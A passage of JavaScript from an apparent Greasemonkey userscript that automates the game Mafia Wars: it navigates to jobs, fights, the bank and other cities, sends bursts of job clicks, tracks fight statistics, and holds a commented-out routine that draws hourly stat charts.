    var elt = xpathFirst('.//div[@class="nav_link profile_link"]//a[contains(.,"Profile")]', mastheadElt);
  }
  if (!elt) {
    addToLog('warning Icon', 'Can\'t find Profile nav link to click.');
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to load my own profile.');
}

function goMyMafiaNav() {
  var elt = xpathFirst('//div[@class="nav_link mafia_link"]//a[contains(.,"My Mafia")]');
  if (!elt) {
    addToLog('warning Icon', 'Can\'t find My Mafia nav link to click.');
    return;
  } else {
    var eltProfile = xpathFirst('//div[@class="nav_link profile_link"]//a[contains(.,"Profile")]');
    if (eltProfile) {
      elt.setAttribute('onclick',eltProfile.getAttribute('onclick').replace(/xw_controller=stats/i,'xw_controller=recruit'));
    }
  }
  clickElement(elt);
  DEBUG('Clicked to load My Mafia nav.');
}

function goMyMafiaTab() {
  var elt = xpathFirst('.//div[@class="tab_content"]//a[contains(., "My Mafia")]', innerPageElt);
  if (!elt) {
    goMyMafiaNav();
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to go to My Mafia tab.');
}

function onMyMafiaTab() {
  // Return true if we're on the My Mafia tab, false otherwise.
  if (xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(., "My Mafia")]', innerPageElt)) {
    return true;
  }

  return false;
}

function goWarTab() {
  var elt = xpathFirst('.//div[@class="tab_content"]//a[contains(., "Declare War")]', innerPageElt);
  if (!elt) {
    goFightNav();
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to go to Declare war.');
}

function goBank() {
  var elt = xpathFirst('//a[@class="bank_deposit"]');
  if (!elt) {
    addToLog('warning Icon', 'Can\'t find bank link to click.');
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to go to bank.');
}

function goJobsNav() {
//  if(new_header){
//    var elt = xpathFirst('//a[@class="header_job_button"]');
//  } else {
//    var elt = xpathFirst('//a[@class="nav_link jobs_link"]/a'); //typo note
//  }
//  if (!elt) {
//    addToLog('warning Icon', 'Can\'t find jobs nav link to click.');
//    return false;
//  }
  var elt = xpathFirst('//div[@class="nav_link jobs_link"]/a');
  if (!elt) {
    var elt = xpathFirst('.//a[@class="header_job_button"]', mastheadElt);
    if (!elt) {
      addToLog('warning Icon', 'Can\'t find jobs nav link to click.');
      return false;
    }
  }
  clickElement(elt);
  DEBUG('Clicked to go to jobs.');
  return true;
}

function goJobTab(tabno) {
  var elt;
  var currentTab = currentJobTab();
  if (currentTab == -1) {
    // We're not even on a jobs page yet. Go there.
    return goJobsNav();
  }
  if (currentTab == tabno) {
    DEBUG('Already on job tab ' + tabno);
    return true;
  }

  // No job tab. Make sure we're on the correct job bar.
  // For NY and BK we look for the 'more jobs' or 'more episodes' tab to move between job bars
  // NY has jobs_bar0 and jobs_bar1 where as BK has only jobs_bar0, account for this later
  var barno = 0;
  if (city == NY) barno = (tabno < 6 ? 0 : 1);
  if (city == BANGKOK) barno = (tabno < 5 ? 0 : 1);
  var currentBar = 0;
  if (city == NY) currentBar = (currentTab < 6 ? 0 : 1);
  if (city == BANGKOK) currentBar = (currentTab < 5 ? 0 : 1);
  DEBUG('goJobTab: city=' + city + ' currentBar=' + currentBar + ' currentTab=' + currentTab + ' barno=' + barno + ' tabno=' + tabno);
  if (currentBar != barno) {
    var jobWord;
    if (city == NY) jobWord = currentBar == 1 ? "Easy Jobs" : "More Jobs";
    if (city == BANGKOK) jobWord = currentBar == 1 ? "Previous" : "More Episodes";
    elt = xpathFirst('.//ul[contains(@id,"jobs_bar")]' +
                     '//a[contains(text(), "'+jobWord+'")]', innerPageElt);
    DEBUG('Clicked to go to job bar ' + barno + '. ');
    clickElement(elt);
    return true;
  }

  // Adjust the barno for BK because BK only has one bar number, jobs_bar0.
  if (city == BANGKOK) barno = 0;

  // Handle old and new tab param names
  elt = xpathFirst('.//ul[@id="jobs_bar' + barno + '"]//a[' +
                   'contains(@onclick, "&story_tab=' + tabno + '") or ' +
                   'contains(@onclick, "&episode_tab=' + tabno + '") or ' +
                   'contains(@onclick, "&tab=' + tabno + '")]', innerPageElt);

  if(!elt) elt = xpathFirst('.//li[@id="tab_' + barno + '"]//a[' +
                   'contains(@onclick, "&story_tab=' + tabno + '") or ' +
                   'contains(@onclick, "&episode_tab=' + tabno + '") or ' +
                   'contains(@onclick, "&tab=' + tabno + '")]', innerPageElt);

  if(!elt) elt = xpathFirst('.//li[@id="tab_' + tabno + '"]//a[' +
                   'contains(@onclick, "&story_tab=' + tabno + '") or ' +
                   'contains(@onclick, "&episode_tab=' + tabno + '") or ' +
                   'contains(@onclick, "&tab=' + tabno + '")]', innerPageElt);

  DEBUG(elt.innerHTML);



  if (!elt) {
    addToLog('warning Icon', 'BUG DETECTED: Can\'t find job bar ' + barno + ', tab ' + tabno + ' link to click. Currently on job bar ' + currentBar + ', tab ' + currentTab + '.');
    return false;
  }
  clickElement(elt);
  DEBUG('Clicked to go to job tab ' + tabno + '.');
  return true;
}
//newlv
 ////////    start go job tab path
function goJobTabPath(tabnopath) {
  var elt;
  var currentTabPath = currentJobTabPath();
  DEBUG('in path go 2 Job sub path: city=' + city + ' ' +  ' currentTabPath=' + currentTabPath +  ' tabnopath=' + tabnopath  );

  if (currentTabPath == tabnopath) {
    DEBUG('Already on job  tab sub path' + tabnopath);
    return true;
  }
  elt = xpathFirst('.//a[contains(@onclick, "ExpertMapController.changePath('+tabnopath+');")]');
  if (!elt) {
    addToLog('warning Icon', 'BUG DETECTED: Can\'t find job tab path link to click. wanting on job path ' + tabnopath + ', current tab path' + currentTabPath + '.');
    return false;
  }
  clickElement(elt);
  DEBUG(' Clicked to go to job tab ' + tabnopath + 'in gojobtabpath elt-b=' + elt );
  return true;
  //  return ;
  }
///////////// end go job tab path

// Get the number of job clicks to attempt
function getJobClicks() {
  var numClicks = 1;
  if (isGMChecked('burstJob') && GM_getValue('burstJobCount', 0) > 0 && !jobOptimizeOn){
    var nextJobXp = missions[GM_getValue('selectMission', 1)][MISSION_XP];
    var nextJobCost = missions[GM_getValue('selectMission', 1)][MISSION_ENERGY];
    numClicks = GM_getValue('burstJobCount', 1);
    while (nextJobCost * numClicks >= energy - nextJobCost &&
           nextJobXp   * numClicks >= ptsToNextLevel - nextJobXp &&
                         numClicks >  1
           ) numClicks--;
  }
  return parseInt(numClicks);
}

function goJob(jobno) {
  // Retrieve the jobRow
  var jobName = missions[GM_getValue('selectMission')][MISSION_NAME];
  var jobNo = missions[GM_getValue('selectMission')][MISSION_NUMBER];
  DEBUG('Clicking jobNo/jobName : '+jobNo+ ' / '+jobName);
  var jobRow = getJobRow(jobName, innerPageElt);
  // Get the action element by job no first
  var elt;
  var tmp = 1 ;
//  if (jobRow) elt = xpathFirst('.//a[contains(@onclick, "job='+jobNo+'")]', jobRow);
  if (jobRow) elt = xpathFirst('.//a[contains(@onclick, "job='+jobNo+'") and not(contains(@onclick, "xw_controller=marketplace"))]', jobRow);
  // if (!elt) elt = xpathFirst('.//a[contains(@onclick, "xw_action=dojob")]', jobRow) ? elt : xpathFirst('.//a[contains(@onclick, "MapController.panelButtonDoJob('+jobNo+');")]');
  // if retrieving by job no fails, simply retrieve the job link
  if (!elt) { elt = xpathFirst('.//a[contains(@onclick, "xw_action=dojob")]', jobRow)                    ; tmp = 2 ;} // first 2 are above line broke down
  if (!elt) { elt = xpathFirst('.//a[contains(@onclick, "MapController.panelButtonDoJob('+jobNo+');")]') ; tmp = 3 ;} // lv jobs
  if (!elt) { elt = xpathFirst('.//a[contains(@onclick, "xw_action=fight_job")]', jobRow)                ; tmp = 4 ;} // i forget :) may not need
  if (!elt) { elt = xpathFirst('.//a[contains(@onclick, "MapController.doFightJob('+jobNo+',\'p|")]')    ; tmp = 5 ;} // will do LV job fight (first of the 3 fights in list), no logic
  if (!elt) { elt = xpathFirst('.//a[contains(@onclick, "ExpertMapController.selectNode('+jobNo+');")]') ; tmp = 6 ;} // in LV jobs, will fight or job for fallback

  //DEBUG(elt.innerHTML);
  if (elt) {
    DEBUG(' job string used was =' + tmp );
    clickAction = 'job';
    suspendBank = false;
    clickBurst (elt, getJobClicks());
    DEBUG('Clicked to perform job: ' + jobName + '.');
    return true;
  } else {
    return false;
  }
}

function goFightNav() {
  var elt = xpathFirst('//div[@id="nav_link_fight_unlock"]//a');
  if (!elt) {
    // Find the visible fight link
    var elts = $x('//div[@class="nav_link fight_link"]//a');
    for (var i = 0, numElts=elts.length; i < numElts; ++i) {
      if (elts[i].scrollWidth) {
        elt = elts[i];
        break;
      }
    }

    if (!elt) {
      addToLog('warning Icon', 'Can\'t find fight nav link to click.');
      return;
    }
  }
  clickElement(elt);
  DEBUG('Clicked to go to fights.');
}

function goFightTab() {
  var elt = xpathFirst('.//div[@class="tab_content"]//a[contains(., "Fight")]', innerPageElt);
  if (!elt) {
    goFightNav();
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to go to fight tab.');
}

function goHitlistTab() {
  var elt = xpathFirst('.//div[@class="tab_content"]//a[contains(., "Hitlist")]', innerPageElt);
  if (!elt) {
    goFightNav();
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to go to hitlist.');
}

function goPropertyNav() {
  if(new_header){
    var elt = xpathFirst('//a[@class="header_properties_button"]')
  } else {
    var elt = xpathFirst('.//span[@id="nav_link_properties"]//a', menubarElt);
  }

  if (!elt) {
    addToLog('warning Icon', 'Can\'t find properties nav link to click.');
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to go to properties.');
}

function goDeleteNews() {
  var elt = xpathFirst('//a[contains(text(), "Clear Updates")]');
  if (!elt) {
    DEBUG('Can\'t find Clear Updates link to click. ');
    return;
  }
  clickElement(elt);
  GM_setValue('logPlayerUpdatesCount', 0);
  DEBUG('Clicked to delete news.');
}

function goNY() {
  goLocation(NY);
}

function goCuba() {
  goLocation(CUBA);
}

function goMoscow() {
  goLocation(MOSCOW);
}

function goLocation(toCity) {
  // Already in this city
  if (toCity == city) {
    DEBUG('Already in ' + cities[toCity][CITY_NAME] + '.');
    return true;
  }

  // Check if level allows traveling to certain cities
  if (level < cities[toCity][CITY_LEVEL]) {
    addToLog('warning Icon', 'WARNING: Current level does not allow travel to ' + cities[toCity][CITY_NAME] + '. ');
    DEBUG('Staying in ' + cities[city][CITY_NAME]);
    return false;
  }

  // Find and click the travel element for the given destination.
  var elt = xpathFirst('//div[@id="travel_menu"]//a[contains(., "' + cities[toCity][CITY_NAME] + '")]');

  if (elt) {
    clickElement(elt);
    DEBUG('Clicked to travel to ' + cities[toCity][CITY_NAME] + '.');
    return true;
  }

  addToLog('warning Icon', 'Unable to find ' + cities[toCity][CITY_NAME] +
           ' travel link. ');
  return false;
}

/*
//ATK
//Hourly Stats Tracking - Experimental Work in Progress
function updateHourlyStats() {
//Planned data package order:  [0]Hour of the Day |
//  [1]NY Fight Exp | [2]NY Fight Win Count   | [3]NY Fight Loss Count | [4]NY Fight $ Won | [5]NY Fight $Lost |
//  [6]NY Rob Exp   | [7]NY Rob Success Count | [8]NY Rob Fail Count   | [9]NY Rob $Won    | [10]NY Rob $Lost  |
//  [11]NY Fight Loss Crit Hit Count | [12]NY Fight Loss Bodyguard Count | [13]NY Fight Loss Too Strong Count |
//  Variables below not yet created
//  [x]NY Capo $US | [x]NY Assist Exp | [x]NY Assist $US |
//  [x]NY Attacked Exp(net after deaths) | [x]NY Attacked $Won | [x]NY Attacked $Lost |
//  [x]NY Robbed Exp                     | [x]NY Robbed $Won   | [x]NY Robbed $Lost   |
//  [x]NY Job Count | [x]NY Job Exp | [x]NY Job $Made |
//  >>> BEGIN CUBA <<<
//  [x]Cuba Fight Exp | [x]Cuba Fight Win Count | [x]Cuba Fight Loss Count | [x]Cuba Fight $C Won | [x]Cuba Fight $C Lost |
//  [x]Cuba Fight Loss Crit Hit Count | [x]Cuba Fight Loss Bodyguard Count | [x]Cuba Fight Loss Too Strong Count |
//  [x]Cuba Capo $C | [x]Cuba Assist Exp | [x]Cuba Assist $C |
//  [x]Cuba Attacked Exp(net after deaths) | [x]Cuba Attacked $C Won | [x]Cuba Attacked $C Lost |
//  [x]Cuba Robbed Exp                     | [x]Cuba Robbed $C Won   | [x]Cuba Robbed $C Lost   |
//  [x]Cuba Job Count | [x]Cuba Job Exp | [x]Cuba Job $C Made

//  Max potential storage 41 * 24 = 984 elements

  var i, currentTime = new Date();
  var currentHour = currentTime.getHours();

  var hrDataPack = "";
  hrDataPack = currentHour + '|' + GM_getValue('fightExpNY', 0) + '|' + GM_getValue('fightWinsNY', 0) + '|' +
     GM_getValue('fightLossesNY', 0) + '|' + GM_getValue('fightWin$NY', 0) + '|' + GM_getValue('fightLoss$NY', 0) + '|' +
     GM_getValue('fightLossCHNY', 0) + '|' + GM_getValue('fightLossBGCHNY', 0) + '|'+ GM_getValue('fightLossStrongNY', 0);

  if (GM_getValue('hourlyStats', '0') == '0') {
    GM_setValue('hourlyStats', hrDataPack);
  } else {
    //pull existing stored hourly stats
    var splitValues = GM_getValue('hourlyStats', '').split(',');
    if (splitValues.length < 24) {
      splitValues.push(currentHour + '|0|0|0|0|0|0|0|0');
    }else {
      if ((GM_getValue('hourOfDay')*1 == 23 && currentHour != 0 )|| currentHour -1 != GM_getValue('hourOfDay')*1 && GM_getValue('hourOfDay') != isNaN(GM_getValue('hourOfDay'))){
        //We missed some hours so we need to carry the last good values forward
        var tempHour;
        if (GM_getValue('hourOfDay')*1 > currentHour){
          tempHour = currentHour + 24;
        }else{
          tempHour = currentHour;
        }

        for (i = GM_getValue('hourOfDay')*1 + 1; i < GM_getValue('hourOfDay')*1 + (tempHour - GM_getValue('hourOfDay')*1); i++){
          var valString = splitValues[GM_getValue('hourOfDay')];
          valString = valString.substring(valString.indexOf('|'), valString.length);
          if (i > 23){
            splitValues.push(String(i-24) + valString);
          }else {
            splitValues.push(i + valString);
          }
        }
      }
    }
    //create temp arrays
    var hourlyFightExpNY = new Array(24);     //position [1]
    var hourlyFightWinsNY = new Array(24);    //position [2]
    var hourlyFightLossesNY = new Array(24);  //position [3]
    var hourlyFightWin$NY = new Array(24);    //position [4]
    var hourlyFightLoss$NY = new Array(24);   //position [5]
    var hourlyLossCrHitNY = new Array(24);    //position [6]
    var hourlyLossBgCrHitNY = new Array(24);  //position [7]
    var hourlyLossStrongNY = new Array(24);   //position [8]

    // Organize Hourly stat data into ordered sets
    for (i = 0; i < splitValues.length; i++){
      //check length of each datapack to ensure it is the right size and fills missing with zeroes
      //this addresses issues when adding new metrics to the datapackage
      if (splitValues[i].split('|').length < 9) {
        for (var n = splitValues[i].split('|').length; n < 9; n++){
          splitValues[i] += '|0';
        }
      }
      if (splitValues[i].split('|')[0] == currentHour) {
        //pull data from same time day prior for "25th" hour
        var fightExpNY25 = splitValues[i].split('|')[1]*1;
        var fightWinsNY25 = splitValues[i].split('|')[2]*1;
        var fightLossesNY25 = splitValues[i].split('|')[3]*1;
        var fightWin$NY25 = splitValues[i].split('|')[4]*1;
        var fightLoss$NY25 = splitValues[i].split('|')[5]*1;
        var fightLossCrHitNY25 = splitValues[i].split('|')[6];
        var fightLossBgCrHitNY25 = splitValues[i].split('|')[7];
        var fightLossStrongNY25 = splitValues[i].split('|')[8];
        //Insert current hour values
        hourlyFightExpNY[splitValues[i].split('|')[0]] = hrDataPack.split('|')[1]*1;
        hourlyFightWinsNY[splitValues[i].split('|')[0]] = hrDataPack.split('|')[2]*1;
        hourlyFightLossesNY[splitValues[i].split('|')[0]] = hrDataPack.split('|')[3]*1;
        hourlyFightWin$NY[splitValues[i].split('|')[0]] = hrDataPack.split('|')[4]*1;
        hourlyFightLoss$NY[splitValues[i].split('|')[0]] = hrDataPack.split('|')[5]*1;
        hourlyLossCrHitNY[splitValues[i].split('|')[0]] = hrDataPack.split('|')[6]*1;
        hourlyLossBgCrHitNY[splitValues[i].split('|')[0]] = hrDataPack.split('|')[7]*1;
        hourlyLossStrongNY[splitValues[i].split('|')[0]] = hrDataPack.split('|')[8]*1;
      } else {
        //populate other hourly data
        hourlyFightExpNY[splitValues[i].split('|')[0]] = splitValues[i].split('|')[1]*1;
        hourlyFightWinsNY[splitValues[i].split('|')[0]] = splitValues[i].split('|')[2]*1;
        hourlyFightLossesNY[splitValues[i].split('|')[0]] = splitValues[i].split('|')[3]*1;
        hourlyFightWin$NY[splitValues[i].split('|')[0]] = splitValues[i].split('|')[4]*1;
        hourlyFightLoss$NY[splitValues[i].split('|')[0]] = splitValues[i].split('|')[5]*1;
        hourlyLossCrHitNY[splitValues[i].split('|')[0]] = splitValues[i].split('|')[6]*1;
        hourlyLossBgCrHitNY[splitValues[i].split('|')[0]] = splitValues[i].split('|')[7]*1;
        hourlyLossStrongNY[splitValues[i].split('|')[0]] = splitValues[i].split('|')[8]*1;
      }
    }

    //Prep Arrays for hourly graphing
    var fightExpNY = prepStatsArray(hourlyFightExpNY, currentHour);
    var fightWinsNY = prepStatsArray(hourlyFightWinsNY, currentHour);
    var fightLossesNY = prepStatsArray(hourlyFightLossesNY, currentHour);
    var fightWin$NY = prepStatsArray(hourlyFightWin$NY, currentHour);
    var fightLoss$NY = prepStatsArray(hourlyFightLoss$NY, currentHour);
    var fightLossCHNY = prepStatsArray(hourlyLossCrHitNY, currentHour);
    var fightLossBGCHNY = prepStatsArray(hourlyLossBgCrHitNY, currentHour);
    var fightLossStrongNY = prepStatsArray(hourlyLossStrongNY, currentHour);

    //Add 25th hour data to beginning of graphing arrays
    fightExpNY.unshift(fightExpNY25);
    fightWinsNY.unshift(fightWinsNY25);
    fightLossesNY.unshift(fightLossesNY25);
    fightWin$NY.unshift(fightWin$NY25);
    fightLoss$NY.unshift(fightLoss$NY25);
    fightLossCHNY.unshift(fightLossCrHitNY25);
    fightLossBGCHNY.unshift(fightLossBgCrHitNY25);
    fightLossStrongNY.unshift(fightLossStrongNY25);

    //create hour labels based on current hour
    var hourLabels = "";
    for (i = 0; i < 24; i += 2) {
      var ind;
      var hrdisp;
      ind = (currentHour *1) - i;
      if (ind < 0) {ind = 24 + ind;}
      if (ind > 11) {hrdisp = String((12 - ind) * -1) + 'p';} else {hrdisp = String(ind) + 'a';}
      hrdisp = (hrdisp == '0a') ? '12a' : hrdisp;
      hrdisp = (hrdisp == '0p') ? '12p' : hrdisp;
      hourLabels = '|' + hrdisp + hourLabels;
    }
    hourLabels = '|' + hourLabels.split('|')[12] + hourLabels;

    //lets make some graphs!
    //statSpecs Array Format: [0]Min, [1]Max. [2]Avg [3]Sum [4]Valid Data Count
    var statSpecsArrayA = [];
    var statSpecsArrayB = [];

    var graphOutput = "";

    //Gain rate per hour
    gainRateNY = [];
    for (i = 0; i < fightWinsNY.length; i++) {
      gainRateNY[i] = fightExpNY[i]/(fightWinsNY[i] + fightLossesNY[i]);
      if (isNaN(gainRateNY[i])) { gainRateNY[i] = 0; }
      gainRateNY[i] = Math.round(gainRateNY[i] * Math.pow(10,2))/Math.pow(10,2);
    }
    statSpecsArrayA = getStatSpecs(gainRateNY, 0);
    graphOutput = '<IMG SRC="' + 'http://chart.apis.google.com/chart?cht=ls&chf=bg,s,111111&chts=BCD2EA,12&chtt=NY+Fight+Gain+Rate+per+Hr+of+Day|Min.+=+' + String(statSpecsArrayA[0]) + '+++Max.+=+' +String(statSpecsArrayA[1]) + '+++Avg+=+' + String(statSpecsArrayA[2]) + '/hr&chs=315x150&chxt=x,y&chxl=0:' + hourLabels + '&chxtc=0,10|1,-300&chxr=1,' + statSpecsArrayA[0] + ',' + statSpecsArrayA[1] + '&chds=' + statSpecsArrayA[0] + ',' + statSpecsArrayA[1] + '&chm=D,04B4AE,0,0,4|o,05E6DE,0,-1.0,6&chd=t:' + String(gainRateNY) + '"/>';

    //NY Fight XP gains per hour
    var diffArrayA = getArrayDiffs(fightExpNY);
    statSpecsArrayA = getStatSpecs(diffArrayA, 0);
    graphOutput += '<br><br>' + '<IMG SRC="' + 'http://chart.apis.google.com/chart?cht=ls&chf=bg,s,111111&chts=BCD2EA,12&chtt=Total+NY+Fight+XP+Gained+per+Hr+of+Day|Min.+=+' + String(statSpecsArrayA[0]) + '+++Max.+=+' +String(statSpecsArrayA[1]) + '+++Avg+=+' + String(statSpecsArrayA[2]) + '/hr&chs=315x150&chxt=x,y&chxl=0:' + hourLabels + '&chxtc=0,10|1,-300&chxr=1,' + statSpecsArrayA[0] + ',' + statSpecsArrayA[1] + '&chds=' + statSpecsArrayA[0] + ',' + statSpecsArrayA[1] + '&chm=D,92ED97,0,0,4|o,25DA2E,0,-1.0,6&chd=t:' + String(diffArrayA) + '"/>';

    //NY Fight Wins/Losses since reset chart
    var NYfightWinPct = (GM_getValue('fightWinsNY', 0)/(GM_getValue('fightWinsNY', 0) + GM_getValue('fightLossesNY', 0)))*100;
    if (isNaN(NYfightWinPct)){NYfightWinPct = 0;} else {NYfightWinPct = Math.round(NYfightWinPct * Math.pow(10, 1))/Math.pow(10, 1);}
    var NYfightLosePct = (GM_getValue('fightLossesNY', 0)/(GM_getValue('fightWinsNY', 0) + GM_getValue('fightLossesNY', 0)))*100;
    if (isNaN(NYfightLosePct)) {NYfightLosePct = 0; } else {NYfightLosePct = Math.round(NYfightLosePct * Math.pow(10, 1))/Math.pow(10, 1);}

    //NY Fight Loss Type breakdown pie
    var NYStrongLossPct = (GM_getValue('fightLossStrongNY', 0)/GM_getValue('fightLossesNY', 0))*100;
    if (isNaN(NYStrongLossPct)){NYStrongLossPct = 0;}else{NYStrongLossPct = Math.round(NYStrongLossPct * Math.pow(10, 1))/Math.pow(10, 1);}
    var NYCHLossPct = (GM_getValue('fightLossCHNY', 0)/GM_getValue('fightLossesNY', 0))*100;
    if (isNaN(NYCHLossPct)){NYCHLossPct = 0;}else{NYCHLossPct = Math.round(NYCHLossPct * Math.pow(10, 1))/Math.pow(10, 1);}
    var NYBGCHLossPct = (GM_getValue('fightLossBGCHNY', 0)/GM_getValue('fightLossesNY', 0))*100;
    if (isNaN(NYBGCHLossPct)){NYBGCHLossPct = 0;}else{NYBGCHLossPct = Math.round(NYBGCHLossPct * Math.pow(10, 1))/Math.pow(10, 1);}

    graphOutput += '<br><br>' + '<IMG SRC="' + 'http://chart.apis.google.com/chart?cht=p3&chf=bg,s,111111&chts=BCD2EA,12&chco=52E259|EC2D2D&chdl=' + String(NYfightWinPct) + '%|'+ String(NYfightLosePct) + '%&chdlp=t&chtt=NY+Fight+Wins+vs+Losses|since+stats+reset&chs=157x150&chd=t:' + String(NYfightWinPct) + ',' + String(NYfightLosePct) + '"/>' +
                          '<IMG SRC="' + 'http://chart.apis.google.com/chart?cht=p3&chf=bg,s,111111&chts=BCD2EA,12&chco=EC2D2D&chdl=CH:' + String(NYCHLossPct) + '%|BG:'+ String(NYBGCHLossPct) + '%|TS:'+ String(NYStrongLossPct) + '%&chdlp=t&chtt=NY+Fight+Losses+by+Type&chs=157x150&chd=t:' + String(NYCHLossPct) + ',' + String(NYBGCHLossPct) + ',' + String(NYStrongLossPct) + '"/><br>' +
                          '<span style="color:#888888;">CH = Critical Hit &#166; BG = Bodyguard Critical Hit &#166; TS = Too Strong</span>';

    //NY Fight $ Won/lost line graph
    statSpecsArrayA = getStatSpecs(fightWin$NY, 0);
    statSpecsArrayB = getStatSpecs(fightLoss$NY, 0);
    if (statSpecsArrayB[0]*1 < statSpecsArrayA[0]*1) {
      statSpecsArrayA[0] = statSpecsArrayB[0];
    }
    if (statSpecsArrayB[1]*1 > statSpecsArrayA[1]*1) {
      statSpecsArrayA[1] = statSpecsArrayB[1];
    }
    graphOutput += '<br><br>' + '<IMG SRC="' + 'http://chart.apis.google.com/chart?cht=ls&chf=bg,s,111111&chts=BCD2EA,12&chtt=Total+NY+Fight+$+Won+vs.+Lost+by+Hr+of+Day&chs=315x150&chxt=x,y&chxl=0:' + hourLabels + '&chxtc=0,10|1,-300&chxr=1,' + statSpecsArrayA[0] + ',' + statSpecsArrayA[1] + '&chds=' + statSpecsArrayA[0] + ',' + statSpecsArrayA[1] + '&chm=D,92ED97,0,0,4|o,25DA2E,0,-1.0,6|D,F05C5C,1,0,4|o,D21414,1,-1.0,6&chd=t:' + String(fightWin$NY) + '|' + String(fightLoss$NY) + '"/>';

    //addToLog('info Icon', graphOutput);
    graphOutput = '<span style="color:#669999;">Stats as of: ' + currentTime.toLocaleString() + '</span><br>' + graphOutput;
    GM_setValue('graphBox', graphOutput);

    //re-pack hourly stats and save to GM variable
    hrDataPack = [];
    for (i = 0; i < 24; i++){
      hrDataPack[i]= i + '|' + hourlyFightExpNY[i] + '|' + hourlyFightWinsNY[i] + '|' + hourlyFightLossesNY[i] + '|' +
          hourlyFightWin$NY[i] + '|' + hourlyFightLoss$NY[i] + '|' + hourlyLossCrHitNY[i] + '|' + hourlyLossBgCrHitNY[i] +
          '|' + hourlyLossStrongNY[i];
    }
    GM_setValue('hourlyStats', String(hrDataPack));

  }
  GM_setValue('hourOfDay', String(currentHour));
}
*/

function prepStatsArray(workingArray, currentHour){
  for (var i = 0; i < workingArray.length; i++){
    if (isNaN(workingArray[i])) {
      workingArray[i] = 0;
    }
  }
  currentHour = currentHour * 1;
  var outputVals = [];
  for (i = 0; i < 24; i++){
    var ind;
    ind = currentHour - i;
    if (ind < 0) {ind = 24 + ind}
      outputVals.unshift(workingArray[ind]);
  }
  return outputVals;
}

//statSpecs Array
//Return Format: [0]Min, [1]Max. [2]Avg [3]Sum [4]Valid Count
function getStatSpecs(workingArray, includeZeroVals){
  var tempArray = [];
  var runningSum = 0;
  var dataLen, dataMin, dataMax;
  for (var i = 0; i < workingArray.length; i++) {
    if (workingArray[i] != 0 && includeZeroVals == 0) {
      tempArray.push(workingArray[i]);
      runningSum += workingArray[i];
    }else {
      runningSum += workingArray[i];
    }
  }
  if (includeZeroVals == 0) {
    tempArray.sort( function (a, b) { return a-b});
    dataLen = tempArray.length;
    dataMin = tempArray[0];
    dataMax = tempArray[dataLen - 1];
  } else {
    workingArray.sort( function (a, b) { return a-b});
    dataLen = workingArray.length;
    dataMin = workingArray[0];
    dataMax = workingArray[dataLen - 1];
  }
  var dataAvg = runningSum/dataLen;
  dataAvg = Math.round(dataAvg*Math.pow(10, 2))/Math.pow(10, 2);
//  alert("Sum: " + runningSum + "    len: " + dataLen + "   avg: " + dataAvg);
  return[dataMin, dataMax, dataAvg, runningSum, dataLen];
}

// This function gets the users gift ID and also sets the ID of
// the recipient of gifts.
function saveRecipientInfo() {
  var giftKey = document.body.innerHTML.match(/gift_key=([0-9a-f]+)/) ? RegExp.$1 : 'Not Found';
  GM_setValue("giftKey", giftKey);

  var recipientID = document.body.innerHTML.match(/recipients\[0\]=([0-9]+)/) ? RegExp.$1 : 'Not Found';
  GM_setValue("recipientID", recipientID);
  alert('Recipient:' + recipientID + '  Gift key:' + giftKey);
}

function takeFightStatistics(experience, winCount, lossCount, cashStr, resultType) {
  var loc = city;
  var xp = parseInt(experience);
  var cashInt = parseCash(cashStr);
  var cashLoc = parseCashLoc(cashStr);

  DEBUG('Attack Stat Results : '+winCount+' / '+lossCount+' / '+cashStr);

  if (winCount > 0) {
    // WON the fight.
    GM_setValue('totalExpInt', GM_getValue('totalExpInt', 0) + xp);
    GM_setValue('fightWinCountInt', GM_getValue('fightWinCountInt', 0) + winCount);
    GM_setValue('totalWinDollarsInt', String(parseInt(GM_getValue('totalWinDollarsInt', 0)) + cashInt));

    switch (loc) {
      case NY:
        // Fight Win NY Stats
        GM_setValue('fightWinsNY', GM_getValue('fightWinsNY', 0) + winCount);
        GM_setValue('fightExpNY', GM_getValue('fightExpNY', 0) + xp);
        break;
      case CUBA:
        // Fight Win Cuba Stats
        GM_setValue('fightWinsCuba', GM_getValue('fightWinsCuba', 0) + winCount);
        GM_setValue('fightExpCuba', GM_getValue('fightExpCuba', 0) + xp);
        break;
      case MOSCOW:
        // Fight Win Moscow Stats
        GM_setValue('fightWinsMoscow', GM_getValue('fightWinsMoscow', 0) + winCount);
        GM_setValue('fightExpMoscow', GM_getValue('fightExpMoscow', 0) + xp);
        break;
      case BANGKOK:
        // Fight Win Bangkok Stats
        GM_setValue('fightWinsBangkok', GM_getValue('fightWinsBangkok', 0) + winCount);
        GM_setValue('fightExpBangkok', GM_getValue('fightExpBangkok', 0) + xp);
        break;
      case LV:
        // Fight Win Las Vegas Stats
        GM_setValue('fightWinsVegas', GM_getValue('fightWinsVegas', 0) + winCount);
        GM_setValue('fightExpVegas', GM_getValue('fightExpVegas', 0) + xp);
        break;
    }
    switch (cashLoc) {
      case NY: GM_setValue('fightWin$NY', String(parseInt(GM_getValue('fightWin$NY', 0)) + cashInt)); break;
      case CUBA: GM_setValue('fightWin$Cuba', String(parseInt(GM_getValue('fightWin$Cuba', 0)) + cashInt)); break;
      case MOSCOW: GM_setValue('fightWin$Moscow', String(parseInt(GM_getValue('fightWin$Moscow', 0)) + cashInt)); break;
      case BANGKOK: GM_setValue('fightWin$Bangkok', String(parseInt(GM_getValue('fightWin$Bangkok', 0)) + cashInt)); break;
      case LV: GM_setValue('fightWin$Vegas', String(parseInt(GM_getValue('fightWin$Vegas', 0)) + cashInt)); break;
    }
  }

  // we lost at least 1 fight
  if (lossCount > 0) {
    GM_setValue('fightLossCountInt', GM_getValue('fightLossCountInt', 0) + lossCount);
    //GM_setValue('totalLossDollarsInt', String(parseInt(GM_getValue('totalLossDollarsInt', 0)) + cashInt));

    switch (loc) {
      case NY:
        //Fight Loss NY Stats
        GM_setValue('fightLossesNY', (GM_getValue('fightLossesNY', 0) + lossCount));
        if (resultType == 2) {
          GM_setValue('fightLossBGCHNY', GM_getValue('fightLossBGCHNY', 0) + lossCount);
        } else if (resultType == 1) {
          GM_setValue('fightLossCHNY', GM_getValue('fightLossCHNY', 0) + lossCount);
        } else {
